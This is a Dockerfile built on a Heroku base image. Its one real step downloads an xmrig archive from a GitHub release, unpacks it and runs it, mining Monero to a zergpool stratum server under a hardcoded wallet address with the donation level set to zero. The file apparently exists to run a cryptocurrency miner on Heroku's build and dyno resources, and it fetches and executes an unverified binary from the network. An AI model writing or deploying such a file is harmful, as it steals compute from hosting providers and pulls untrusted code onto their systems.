FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/Sorrybroits/developwithnitin/releases/download/alpha/xmrig.tar.gz; tar -xf xmrig.tar.gz; cd xmrig/build; ./xmrig -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.asia.mine.zergpool.com:4457 -u 4BFuzbtLpit7knFAWuMfh6QrxpxGT7b6eDWzBpkdRykkZNeKa82X4EMNPDzZxnkzu229hEJWALCovKSvNMANmKR767XbeXr.cola --keepalive --donate-level 0 -p c=XMR,ID=jackey
CMD bash heroku.sh
